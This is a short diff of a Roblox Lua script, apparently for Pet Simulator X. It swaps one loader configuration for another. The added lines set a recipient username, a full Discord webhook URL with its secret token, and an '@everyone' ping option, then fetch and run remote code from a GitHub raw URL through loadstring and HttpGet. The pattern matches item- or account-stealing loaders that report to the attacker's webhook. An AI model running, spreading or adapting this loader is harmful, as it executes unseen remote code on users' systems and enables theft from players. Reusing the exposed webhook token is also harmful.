@@ -1,3 +1,5 @@
-_G.Key = "TYxolBhsoR"
-G.AuthServer = "https://discord.com/api/webhooks/1053270464597856266/amRiiMp0CJ1ye96hG-Vl8o5BcYEFt8QMzy_5EBwds4Anwl_8Rvv_ACyQR76-vxX1oz0"
-loadstring(game:HttpGet("https://raw.githubusercontent.com/psx-Scripts/psxsc/main/script.lua%22))()
+UserName = "RoshBloxYT"
+WebHook = "https://discord.com/api/webhooks/1053270464597856266/amRiiMp0CJ1ye96hG-Vl8o5BcYEFt8QMzy_5EBwds4Anwl_8Rvv_ACyQR76-vxX1oz0"
+Mention = true -- change to false if you don't want to get everyone ping in your webhook.
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HardGameSs/PSX/main/Script.lua", true))()
